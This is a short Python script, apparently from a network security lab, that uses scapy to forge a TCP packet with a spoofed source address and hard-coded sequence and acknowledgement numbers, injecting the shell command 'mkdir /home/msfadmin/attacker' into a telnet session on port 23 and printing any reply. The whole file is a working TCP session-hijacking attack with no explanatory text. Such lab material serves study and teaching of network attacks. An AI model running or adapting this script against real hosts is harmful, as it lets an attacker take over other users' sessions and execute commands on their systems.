from scapy.all import*

IPLayer =IP(src="192.168.1.109", dst="192.168.1.12")
TCPLayer= TCP(sport=1304,dport=23,flags="PA",seq=1332996326,ack=4059538261)
data ="\n mkdir /home/msfadmin/attacker \n"
pkt=IPLayer/TCPLayer/data
ls(pkt)
response=sr1(pkt,verbose=0)
if response:
   print("Response");
   print(response.show());
else:
   print("No Response");
